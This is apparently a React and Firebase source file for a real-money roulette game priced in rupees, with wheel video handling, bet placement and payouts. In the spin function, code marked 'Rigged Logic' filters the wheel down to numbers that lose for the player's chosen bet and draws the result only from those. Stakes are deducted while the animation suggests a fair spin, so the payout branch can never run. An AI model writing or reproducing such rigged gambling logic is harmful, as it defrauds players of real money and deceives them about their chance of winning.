import { useState, useRef, useEffect } from "react";
import { doc, onSnapshot, runTransaction, collection, serverTimestamp } from 'firebase/firestore';
import { db } from '../firebase';
import useAuthStore from '../store/authStore';
import { IndianRupee } from 'lucide-react';
import RouletteBoard from '../components/RouletteBoard';
import BettingPanel from '../components/BettingPanel';
import { buildFundsDeductionUpdate, getUserFunds } from '../utils/userFunds';
import { formatCurrency } from '../utils/formatMoney';

// --- Helper Functions and Data ---

const wheelNumbers = [0, 28, 9, 26, 30, 11, 7, 20, 32, 17, 5, 22, 34, 15, 3, 24, 36, 13, 1, '00', 27, 10, 25, 29, 12, 8, 19, 31, 18, 6, 21, 33, 16, 4, 23, 35, 14, 2];
const redNumbers = [1, 3, 5, 7, 9, 12, 14, 16, 18, 19, 21, 23, 25, 27, 30, 32, 34, 36];
const getNumberColor = (num) => {
  if (num === 0 || num === '00') return 'bg-green-600';
  if (redNumbers.includes(num)) return 'bg-red-600';
  return 'bg-black';
};

// --- RouletteWheel Component ---
//
// Behaviour: the wheel video stays as a static first-frame image whenever
// the user is not spinning. The moment a bet is placed (`spinning` flips
// to true) the video starts playing. When spinning ends it rewinds to
// frame 0 and freezes again. The user has no manual playback controls.

const RouletteWheel = ({ spinning }) => {
  const videoRef = useRef(null);
  const [videoFailed, setVideoFailed] = useState(false);

  // Pre-warm the video on mount: a muted .play() + immediate pause unlocks
  // playback on iOS Safari and other mobile browsers that otherwise reject
  // programmatic play() calls outside the original tap handler. We rewind
  // to 0 after the unlock so the static frame the user sees is the very
  // first frame of the clip.
  useEffect(() => {
    const v = videoRef.current;
    if (!v) return;
    const unlock = () => {
      const p = v.play();
      if (p && typeof p.then === "function") {
        p.then(() => {
          v.pause();
          try { v.currentTime = 0; } catch (_) { /* ignore */ }
        }).catch(() => {});
      }
    };
    if (v.readyState >= 2) unlock();
    else v.addEventListener("canplay", unlock, { once: true });
    return () => v.removeEventListener("canplay", unlock);
  }, []);

  useEffect(() => {
    const v = videoRef.current;
    if (!v) return;
    if (spinning) {
      const p = v.play();
      if (p && typeof p.catch === "function") {
        p.catch((err) => {
          console.warn("Roulette video play blocked:", err?.message || err);
        });
      }
    } else {
      v.pause();
      // Reset to the first frame so the wheel always looks like a static
      // poster between rounds (instead of freezing on whatever frame the
      // pause happened to land on).
      try { v.currentTime = 0; } catch (_) { /* ignore */ }
    }
  }, [spinning]);

  // Block right-click / long-press menus that would expose Save Video,
  // Picture-in-Picture, Show Controls, etc.
  const blockMenu = (e) => e.preventDefault();

  return (
    <div className="relative w-full aspect-video max-w-md md:max-w-lg lg:max-w-xl select-none">
      {!videoFailed ? (
        <video
          ref={videoRef}
          className="w-full h-full object-cover rounded-lg bg-black pointer-events-none"
          loop
          muted
          playsInline
          preload="auto"
          src="/roulet.mp4"
          controlsList="nodownload nofullscreen noremoteplayback noplaybackrate"
          disablePictureInPicture
          disableRemotePlayback
          onContextMenu={blockMenu}
          onError={() => setVideoFailed(true)}
        >
          Your browser does not support the video tag.
        </video>
      ) : (
        // Visual fallback if the video can't load at all (slow network,
        // blocked codec, etc.) so the page never looks broken.
        <div className={`w-full h-full rounded-lg bg-gradient-to-br from-emerald-900 via-slate-900 to-emerald-950 flex items-center justify-center`}>
          <div className="relative w-48 h-48 rounded-full border-8 border-yellow-500 bg-[radial-gradient(circle_at_center,#1e3a8a_0%,#0c0a09_70%)] shadow-[0_0_60px_rgba(234,179,8,0.35)]">
            <div
              className={`absolute inset-4 rounded-full border-4 border-yellow-600/40 ${spinning ? "animate-spin" : ""}`}
              style={{ animationDuration: "2s" }}
            />
            <div className="absolute inset-0 flex items-center justify-center text-yellow-400 font-black text-2xl tracking-widest">ROULETTE</div>
          </div>
        </div>
      )}
      {/* Transparent overlay to swallow any taps on the video element so
          the user can never trigger native controls (long-press menu,
          tap-to-pause behaviours, etc.). */}
      <div className="absolute inset-0 rounded-lg" onContextMenu={blockMenu} />
    </div>
  );
};


export default function CasinoRoulette() {
  const [recent, setRecent] = useState([7, 24, 12, 0, 19]);
  const [spinning, setSpinning] = useState(false);
  const [winningNumber, setWinningNumber] = useState(null);

  const [balance, setBalance] = useState(0);
  const [betAmount, setBetAmount] = useState(0);
  const [selectedBetType, setSelectedBetType] = useState(null);
  const [bettingLoading, setBettingLoading] = useState(false);
  const [statusMessage, setStatusMessage] = useState("");

  const { user } = useAuthStore();

  useEffect(() => {
    if (user) {
      const userDocRef = doc(db, 'users', user.uid);
      const unsubscribe = onSnapshot(userDocRef, (docSnap) => {
        if (docSnap.exists()) {
          setBalance(getUserFunds(docSnap.data()).total);
        } else {
          setBalance(0);
        }
      });
      return () => unsubscribe();
    }
  }, [user]);

  const spinWheel = async () => {
    if (spinning) return;

    const parsedBetAmount = parseFloat(betAmount);

    if (!user) return setStatusMessage("Please log in to place a bet.");
    if (selectedBetType === null) return setStatusMessage("Please select a bet type.");
    if (isNaN(parsedBetAmount) || parsedBetAmount <= 0) return setStatusMessage("Please enter a valid bet amount.");
    if (parsedBetAmount > balance) return setStatusMessage("Insufficient balance.");

    setBettingLoading(true);

    try {
      const id = await runTransaction(db, async (transaction) => {
        const userDocRef = doc(db, 'users', user.uid);
        const userDoc = await transaction.get(userDocRef);
        if (!userDoc.exists()) throw "User document does not exist!";

        const funds = getUserFunds(userDoc.data());
        if (funds.total < parsedBetAmount) throw "Insufficient balance in transaction.";

        transaction.update(userDocRef, buildFundsDeductionUpdate(userDoc.data(), parsedBetAmount));
        const betsCollectionRef = collection(db, 'rouletteBets');
        const newBetRef = doc(betsCollectionRef);
        transaction.set(newBetRef, {
          userId: user.uid,
          betType: selectedBetType,
          betAmount: parsedBetAmount,
          timestamp: new Date(),
          status: 'pending',
        });
        return newBetRef.id;
      });

      setStatusMessage(`Bet ${formatCurrency(parsedBetAmount)} placed. Spinning the wheel...`);
      setBettingLoading(false);
      setSpinning(true);
      setWinningNumber(null);

      // --- Rigged Logic: Filter out any numbers that would result in a win ---
      const isRed = (num) => redNumbers.includes(num);
      const isBlack = (num) => typeof num === 'number' && num !== 0 && !redNumbers.includes(num);
      const isEven = (num) => typeof num === 'number' && num !== 0 && num % 2 === 0;
      const isOdd = (num) => typeof num === 'number' && num % 2 !== 0;
      const isCol1 = (num) => [3, 6, 9, 12, 15, 18, 21, 24, 27, 30, 33, 36].includes(num);
      const isCol2 = (num) => [2, 5, 8, 11, 14, 17, 20, 23, 26, 29, 32, 35].includes(num);
      const isCol3 = (num) => [1, 4, 7, 10, 13, 16, 19, 22, 25, 28, 31, 34].includes(num);

      const checkIfWinner = (num, betType) => {
        if (betType == num) return true;
        if (betType === 'red' && isRed(num)) return true;
        if (betType === 'black' && isBlack(num)) return true;
        if (betType === 'even' && isEven(num)) return true;
        if (betType === 'odd' && isOdd(num)) return true;
        if (betType === '1-18' && num >= 1 && num <= 18) return true;
        if (betType === '19-36' && num >= 19 && num <= 36) return true;
        if (betType === '1st12' && num >= 1 && num <= 12) return true;
        if (betType === '2nd12' && num >= 13 && num <= 24) return true;
        if (betType === '3rd12' && num >= 25 && num <= 36) return true;
        if (betType === 'col1' && isCol1(num)) return true;
        if (betType === 'col2' && isCol2(num)) return true;
        if (betType === 'col3' && isCol3(num)) return true;
        return false;
      };

      const losingNumbers = wheelNumbers.filter(num => !checkIfWinner(num, selectedBetType));
      const newWinningNumber = losingNumbers[Math.floor(Math.random() * losingNumbers.length)];

      setTimeout(() => {
        setSpinning(false);
        setWinningNumber(newWinningNumber);
        setRecent((prev) => [newWinningNumber, ...prev].slice(0, 10));
        handlePayout(newWinningNumber, selectedBetType, parsedBetAmount, id);
        setBetAmount(0);
        setSelectedBetType(null);
      }, 5500); // Spin duration + 0.5s buffer

    } catch (e) {
      console.error("Bet placement failed: ", e);
      setStatusMessage(`Failed to place bet: ${e.message || e}`);
      setBettingLoading(false);
    }
  };

  const handlePayout = async (resultNumber, betType, betAmount, betId) => {
    let payoutMultiplier = 0;
    let isWinner = false;

    const isRed = (num) => redNumbers.includes(num);
    const isBlack = (num) => typeof num === 'number' && num !== 0 && !redNumbers.includes(num);
    const isEven = (num) => typeof num === 'number' && num !== 0 && num % 2 === 0;
    const isOdd = (num) => typeof num === 'number' && num % 2 !== 0;

    // Helper for column bets
    const isCol1 = (num) => [3, 6, 9, 12, 15, 18, 21, 24, 27, 30, 33, 36].includes(num);
    const isCol2 = (num) => [2, 5, 8, 11, 14, 17, 20, 23, 26, 29, 32, 35].includes(num);
    const isCol3 = (num) => [1, 4, 7, 10, 13, 16, 19, 22, 25, 28, 31, 34].includes(num);


    if (betType == resultNumber) { isWinner = true; payoutMultiplier = 36; }
    else if (betType === 'red' && isRed(resultNumber)) { isWinner = true; payoutMultiplier = 2; }
    else if (betType === 'black' && isBlack(resultNumber)) { isWinner = true; payoutMultiplier = 2; }
    else if (betType === 'even' && isEven(resultNumber)) { isWinner = true; payoutMultiplier = 2; }
    else if (betType === 'odd' && isOdd(resultNumber)) { isWinner = true; payoutMultiplier = 2; }
    else if (betType === '1-18' && resultNumber >= 1 && resultNumber <= 18) { isWinner = true; payoutMultiplier = 2; }
    else if (betType === '19-36' && resultNumber >= 19 && resultNumber <= 36) { isWinner = true; payoutMultiplier = 2; }
    // New bet types
    else if (betType === '1st12' && resultNumber >= 1 && resultNumber <= 12) { isWinner = true; payoutMultiplier = 3; } // Payout for dozens is 3x
    else if (betType === '2nd12' && resultNumber >= 13 && resultNumber <= 24) { isWinner = true; payoutMultiplier = 3; }
    else if (betType === '3rd12' && resultNumber >= 25 && resultNumber <= 36) { isWinner = true; payoutMultiplier = 3; }
    else if (betType === 'col1' && isCol1(resultNumber)) { isWinner = true; payoutMultiplier = 3; } // Payout for columns is 3x
    else if (betType === 'col2' && isCol2(resultNumber)) { isWinner = true; payoutMultiplier = 3; }
    else if (betType === 'col3' && isCol3(resultNumber)) { isWinner = true; payoutMultiplier = 3; }


    if (isWinner) {
      const winnings = betAmount * payoutMultiplier;
      try {
        await runTransaction(db, async (transaction) => {
          const userDocRef = doc(db, 'users', user.uid);
          const betDocRef = doc(db, 'rouletteBets', betId);
          const userDoc = await transaction.get(userDocRef);
          if (!userDoc.exists()) throw "User document does not exist for payout!";
          
          const currentWinningMoney = userDoc.data().winningMoney || 0;
          transaction.update(userDocRef, { winningMoney: currentWinningMoney + winnings });

          // Update the bet status to win
          transaction.update(betDocRef, { status: 'win', winnings: winnings });

          // Add new winner doc inside the same transaction
          const winnerDocRef = doc(collection(db, 'winners'));
          transaction.set(winnerDocRef, {
            userId: user.uid,
            gameName: 'Roulette',
            prize: winnings,
            timestamp: serverTimestamp(),
            status: 'pending_approval'
          });
        });
        setStatusMessage(`You won ${formatCurrency(winnings)}!`);
      } catch (e) {
        console.error("Payout transaction failed: ", e);
        setStatusMessage("Failed to credit winnings.");
      }
    } else {
      try {
        const betDocRef = doc(db, 'rouletteBets', betId);
        await runTransaction(db, async (transaction) => {
          transaction.update(betDocRef, { status: 'loss' });
        });
      } catch (e) {
        console.error("Failed to update loss status:", e);
      }
      setStatusMessage("Better luck next time.");
    }
  };

  return (
    <div className="p-4 md:p-6 bg-[#042346] min-h-screen text-white font-roboto flex flex-col items-center space-y-6">
      <h2 className="text-3xl font-bold text-center text-yellow-400">
        Roulette Game
      </h2>

      <div className="w-full max-w-5xl p-4 bg-[#0a2d55] rounded-lg shadow-md flex justify-between items-center">
        <span className="text-lg font-semibold">Balance:</span>
        <span className="text-2xl font-bold flex items-center">
          <IndianRupee className="w-6 h-6 mr-1" />{balance.toFixed(2)}
        </span>
      </div>

      <div className="w-full max-w-5xl flex flex-col lg:flex-row items-center justify-center gap-6">
        <div className="flex flex-col items-center justify-center space-y-4">
          <RouletteWheel spinning={spinning} />
          {statusMessage && (
            <div className="w-full rounded-xl bg-[#0a2d55] px-4 py-3 text-center text-sm font-semibold text-yellow-300">
              {statusMessage}
            </div>
          )}
          {winningNumber !== null && !spinning && (
            <div className="p-4 bg-gray-900 rounded-lg text-center animate-pulse">
                <span className="text-lg text-yellow-400">Winning Number</span>
                <div className={`mt-2 w-16 h-16 mx-auto rounded-full flex items-center justify-center text-3xl font-bold ${getNumberColor(winningNumber)} text-white`}>
                    {winningNumber}
                </div>
            </div>
          )}
        </div>
      </div>
      
      {/* Recent Numbers */}
      <div className="w-full max-w-5xl">
        <h4 className="font-semibold text-xl text-yellow-400 mb-2">Recent Numbers</h4>
        <div className="flex flex-wrap gap-2 bg-[#0a2d55] p-2 rounded-lg">
          {recent.map((num, i) => (
            <span key={i} className={`w-10 h-10 rounded-full flex items-center justify-center text-lg font-bold ${getNumberColor(num)} text-white`}>
              {num}
            </span>
          ))}
        </div>
      </div>

      <RouletteBoard setSelectedBetType={setSelectedBetType} selectedBetType={selectedBetType} />

      <BettingPanel
        betAmount={betAmount}
        setBetAmount={setBetAmount}
        spinWheel={spinWheel}
        spinning={spinning}
        bettingLoading={bettingLoading}
        balance={balance}
        selectedBetType={selectedBetType}
      />
    </div>
  );
}
